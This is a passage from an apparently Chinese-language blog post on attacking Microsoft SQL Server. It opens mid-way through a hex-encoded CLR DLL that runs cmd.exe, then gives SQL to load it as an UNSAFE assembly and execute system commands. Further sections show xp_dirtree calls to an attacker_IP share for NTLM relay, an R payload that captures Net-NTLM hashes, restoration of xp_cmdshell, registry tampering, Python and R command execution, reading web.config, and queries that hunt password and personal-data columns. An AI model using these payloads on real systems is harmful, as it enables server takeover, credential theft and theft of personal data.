0050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468006D7373716C5F434C522E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A00200000005E54E0227F5F5E409B9302C5EA5F62E7000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006607056200000000020000001C010000E42A0000E40C000052534453F12CF9670467FE4789AA4C0BB3C9132401000000433A5C55736572735C546573745C736F757263655C7265706F735C6D7373716C5F434C525C6D7373716C5F434C525C6F626A5C44656275675C6D7373716C5F434C522E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000006D007300730071006C005F0043004C0052002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006D007300730071006C005F0043004C0052002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">  WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>



<p>– 创建CLR函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[ExecCommand]</span><br><span class="line">@cmd NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [mssql_CLR].[StoredProcedures].[ExecCommand]</span><br><span class="line">go</span><br></pre></td></tr></table></figure>



<p>– 利用CLR执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbo.ExecCommand &quot;whoami /all&quot;;</span><br></pre></td></tr></table></figure>



<p>格式简化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- 导入CLR插件</span><br><span class="line">CREATE ASSEMBLY [clrdata]</span><br><span class="line">AUTHORIZATION [dbo]</span><br><span class="line">FROM 0x16进制的dll</span><br><span class="line">WITH PERMISSION_SET = UNSAFE;</span><br><span class="line"></span><br><span class="line">-- 创建CLR函数</span><br><span class="line">CREATE PROCEDURE [dbo].[testclrexec]</span><br><span class="line">@method NVARCHAR (MAX) , @arguments NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [clrdata].[StoredProcedures].[testclrexec]</span><br><span class="line"></span><br><span class="line">-- 利用CLR执行系统命令</span><br><span class="line">exec testclrexec &#x27;cmdexec&#x27;,N&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>



<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p>tips: 08之前的系统还可以写启动项、粘贴键替换。</p>
<h2 id="xp-dirtree"><a href="#xp-dirtree" class="headerlink" title="xp_dirtree"></a>xp_dirtree</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录。内容会很多,慎用</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure>



<h2 id="xp-dirtree-1"><a href="#xp-dirtree-1" class="headerlink" title="xp_dirtree"></a>xp_dirtree</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 只列 c:\ 文件夹</span><br><span class="line">exec xp_dirtree &#x27;c:&#x27;,1</span><br><span class="line">-- 列 c:\ 文件夹加文件</span><br><span class="line">exec xp_dirtree &#x27;c:&#x27;,1,1</span><br><span class="line">-- 列出所有 c:\ 文件和目录,子目录,内容会很多,慎用</span><br><span class="line">exec xp_dirtree &#x27;c:&#x27;</span><br></pre></td></tr></table></figure>



<p>xp_dirtree 还可以用来触发 NTLM 请求,进行中继攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree &#x27;\\&lt;attacker_IP&gt;\any\thing&#x27;</span><br><span class="line">exec master.dbo.xp_dirtree &#x27;\\&lt;attacker_IP&gt;\any\thing&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h2><p>用于得到给定的文件夹内的文件夹列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 列出 C:\\ 目录</span><br><span class="line">exec xp_subdirs &quot;C:\\&quot;</span><br></pre></td></tr></table></figure>



<h2 id="xp-availablemedia"><a href="#xp-availablemedia" class="headerlink" title="xp_availablemedia"></a>xp_availablemedia</h2><p>用于获得当前所有驱动器</p>
<p>– 列出磁盘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_availablemedia</span><br></pre></td></tr></table></figure>

<h2 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h2><p>于判断文件是否存在的存储过程，参数是文件（file）的路径或目录的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 判断文件 D:\test.txt 是否存在</span><br><span class="line">exec master.sys.xp_fileexist &#x27;D:\test.txt&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="xp-create-subdir"><a href="#xp-create-subdir" class="headerlink" title="xp_create_subdir"></a>xp_create_subdir</h2><p>用于创建子目录的存储过程，参数是子目录的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 创建子目录 D:\test</span><br><span class="line">exec master.sys.xp_create_subdir &#x27;D:\test&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="xp-delete-file"><a href="#xp-delete-file" class="headerlink" title="xp_delete_file"></a>xp_delete_file</h2><p>可用于删除文件的存储过程，但该存储过程不会删除任意类型的文件，系统限制它只能删除特定类型（备份文件和报表文件）的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 删除文件</span><br><span class="line">declare @Date datetime = dateadd(day,-30,getdate())</span><br><span class="line">exec master.sys.xp_delete_file 0,&#x27;D:\test\&#x27;,&#x27;bak&#x27;,@Date,0</span><br></pre></td></tr></table></figure>

<p>– 第一个参数是文件类型（File Type），有效值是0和1，0是指备份文件，1是指报表文件；<br>– 第二个参数是目录路径（Folder Path）， 目录中的文件会被删除，目录路径必须以“\”结尾；<br>– 第三个参数是文件的扩展名（File Extension），常用的扩展名是’BAK’ 或’TRN’；<br>– 第四个参数是Date，早于该日期创建的文件将会被删除；<br>– 第五个参数是子目录（Subfolder），bool类型，0是指忽略子目录，1是指将会删除子目录中的文件；</p>
<h2 id="xp-regenumkeys"><a href="#xp-regenumkeys" class="headerlink" title="xp_regenumkeys"></a>xp_regenumkeys</h2><p>可以查看指定的注册表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 枚举可用的注册表键值</span><br><span class="line">exec xp_regenumkeys &#x27;HKEY_CURRENT_USER&#x27;,&#x27;Control Panel\International&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="xp-regdeletekey"><a href="#xp-regdeletekey" class="headerlink" title="xp_regdeletekey"></a>xp_regdeletekey</h2><p>可以删除指定的注册表值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 删除指定的注册表值</span><br><span class="line">EXEC xp_regdeletekey &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>



<h2 id="sp-addextendedproc"><a href="#sp-addextendedproc" class="headerlink" title="sp_addextendedproc"></a>sp_addextendedproc</h2><p>可以利用于恢复组件,如恢复xp_cmdshell。更多如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_addextendedproc xp_cmdshell ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_enumgroups ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_loginconfig ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_enumerrorlogs ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_getfiledetails ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc Sp_OACreate ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc Sp_OADestroy ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc Sp_OAGetErrorInfo ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc Sp_OAGetProperty ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc Sp_OAMethod ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc Sp_OASetProperty ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc Sp_OAStop ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_regaddmultistring ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_regdeletekey ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_regdeletevalue ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_regenumvalues ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_regremovemultistring ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_regwrite ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_dirtree ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_regread ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">EXEC sp_addextendedproc xp_fixeddrives ,@dllname =&#x27;xpstar.dll&#x27;</span><br></pre></td></tr></table></figure>



<p>删除存储过程，可以用如上方法恢复</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="配合脚本"><a href="#配合脚本" class="headerlink" title="配合脚本"></a>配合脚本</h1><p>在 SQL Server 2017 及更高版本中，R 与 Python 一起随附在机器学习服务中。该服务允许通过 SQL Server 中 sp_execute_external_script 执行 Python 和 R 脚本</p>
<p>利用条件：</p>
<ul>
<li>Machine Learning Services 必须要在 Python 安装过程中选择</li>
</ul>
<p>必须启用外部脚本</p>
<ul>
<li><p>EXEC sp_configure ‘external scripts enabled’, 1</p>
</li>
<li><p>RECONFIGURE WITH OVERRIDE</p>
</li>
<li><p>重新启动数据库服务器</p>
</li>
<li><p>用户拥有执行任何外部脚本权限</p>
</li>
</ul>
<p>R 脚本利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 利用 R 执行命令</span><br><span class="line">sp_configure &#x27;external scripts enabled&#x27;</span><br><span class="line">GO</span><br><span class="line">EXEC sp_execute_external_script</span><br><span class="line">@language=N&#x27;R&#x27;,</span><br><span class="line">@script=N&#x27;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe /c dir&quot;,intern=T))&#x27;</span><br><span class="line">WITH RESULT SETS (([cmd_out] text));</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 利用 R 抓取 Net-NTLM 哈希</span><br><span class="line">@script=N&#x27;.libPaths(&quot;\\\\testhost\\foo\\bar&quot;);library(&quot;0mgh4x&quot;)&#x27;</span><br></pre></td></tr></table></figure>



<p>Python 脚本利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-- 查看版本</span><br><span class="line">exec sp_execute_external_script</span><br><span class="line">@language =N&#x27;Python&#x27;,</span><br><span class="line">@script=N&#x27;import sys</span><br><span class="line">OutputDataSet = pandas.DataFrame([sys.version])&#x27;</span><br><span class="line">WITH RESULT SETS ((python_version nvarchar(max)))</span><br><span class="line"></span><br><span class="line">-- 利用 Python 执行命令</span><br><span class="line">exec sp_execute_external_script</span><br><span class="line">@language =N&#x27;Python&#x27;,</span><br><span class="line">@script=N&#x27;import subprocess</span><br><span class="line">p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;, stdout=subprocess.PIPE)</span><br><span class="line">OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#x27;</span><br><span class="line"></span><br><span class="line">-- 利用 Python 读文件</span><br><span class="line">EXECUTE sp_execute_external_script @language = N&#x27;Python&#x27;, @script = N&#x27;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&#x27;</span><br><span class="line">WITH RESULT SETS (([cmd_out] nvarchar(max)))</span><br></pre></td></tr></table></figure>

<p>xx 库中所有字段名带 pass|pwd 的表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select [name] from [xx].[dbo].sysobjects where id in(select id from [xx].[dbo].syscolumns Where name like &#x27;%pass%&#x27; or name like &#x27;%pwd%&#x27;)</span><br></pre></td></tr></table></figure>

<p>xx 库中所有字段名带个人信息的表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select [name] from [xx].[dbo].sysobjects where id in(select id from [xx].[dbo].syscolumns Where name like &#x27;%name%&#x27; or name like &#x27;%phone%&#x27; or name like &#x27;%mobile%&#x27; or name like &#x27;%certificate%&#x27; or name like &#x27;%number%&#x27; or name like &#x27;%email%&#x27; or name like &#x27;%addr%&#x27; or name like &#x27;%card%&#x27; or name like &#x27;%电话%&#x27; or name like &#x27;%地址%&#x27; or name like &#x27;%身份证%&#x27; or name like &#x27;%姓名%&#x27;)</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://timerings.github.io">Flyink</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://timerings.github.io/posts/23017.html">https://timerings.github.io/posts/23017.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://timerings.github.io" target="_blank">Flyink's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/img/2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/54905.html" title="内网渗透基于hash凭证抓取"><img class="cover" src="/img/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">内网渗透基于hash凭证抓取</div></div></a></div><div class="next-post pull-right"><a href="/posts/64193.html" title="SQL注入技术总结-Oracle"><img class="cover" src="/img/4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQL注入技术总结-Oracle</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/19435.html" title="SQL注入技术总结-MySql"><img class="cover" src="/img/12.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">SQL注入技术总结-MySql</div></div></a></div><div><a href="/posts/64193.html" title="SQL注入技术总结-Oracle"><img class="cover" src="/img/4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">SQL注入技术总结-Oracle</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Flyink</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Timerings"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%9B%9E%E6%98%BE%E6%93%8D%E4%BD%9C"><span class="toc-text">全回显操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%95%E4%B8%AA%E7%88%86%E7%A0%B4%EF%BC%9A"><span class="toc-text">(1)单个爆破：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86%E8%A1%A8"><span class="toc-text">(2)爆表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">时间注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XP-CMDSHELL-%E6%A3%80%E6%B5%8B"><span class="toc-text">XP_CMDSHELL 检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GetShell"><span class="toc-text">GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8Bxp-cmdshell%E5%86%99shell"><span class="toc-text">存储过程xp_cmdshell写shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8Bsp-oacreate%E5%86%99shell"><span class="toc-text">存储过程sp_oacreate写shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%A4%87%E4%BB%BD%E5%86%99shell"><span class="toc-text">日志备份写shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E5%86%99shell"><span class="toc-text">差异备份写shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-text">沙盒提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-regwrite"><span class="toc-text">xp_regwrite</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%A5%E5%8A%AB%E6%8C%81%E7%B2%98%E8%B4%B4%E9%94%AE-%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-text">修改注册表来劫持粘贴键(映像劫持)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86-COM-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%86%8C%E5%88%B0-CLSID"><span class="toc-text">将 COM 对象注册到 CLSID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD-AutoRun"><span class="toc-text">CMD AutoRun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-RunOnce"><span class="toc-text">Run &amp; RunOnce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8%E6%8C%87%E5%AE%9A%E8%BD%AF%E4%BB%B6"><span class="toc-text">禁用指定软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ole-automation-procedures%E6%8F%90%E6%9D%83"><span class="toc-text">Ole automation procedures提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JobAgent%E6%8F%90%E6%9D%83"><span class="toc-text">JobAgent提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR%E6%8F%90%E6%9D%83"><span class="toc-text">CLR提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Other"><span class="toc-text">Other</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-dirtree"><span class="toc-text">xp_dirtree</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-dirtree-1"><span class="toc-text">xp_dirtree</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-subdirs"><span class="toc-text">xp_subdirs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-availablemedia"><span class="toc-text">xp_availablemedia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-fileexist"><span class="toc-text">xp_fileexist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-create-subdir"><span class="toc-text">xp_create_subdir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-delete-file"><span class="toc-text">xp_delete_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-regenumkeys"><span class="toc-text">xp_regenumkeys</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-regdeletekey"><span class="toc-text">xp_regdeletekey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 